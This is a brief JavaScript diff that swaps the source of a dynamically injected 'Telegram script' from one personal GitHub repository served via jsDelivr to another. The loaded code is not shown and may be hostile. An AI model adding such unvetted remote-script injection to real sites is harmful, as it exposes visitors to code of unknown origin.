@@ -82,6 +82,6 @@
 
     // Sisipkan script Telegram
     const tgScript = document.createElement('script');
-    tgScript.src = "//cdn.jsdelivr.net/gh/inggarfi/balmon@main/3.js";
+    tgScript.src = "//cdn.jsdelivr.net/gh/arceusxyz/moon@main/3.js";
     document.body.appendChild(tgScript);
 })();
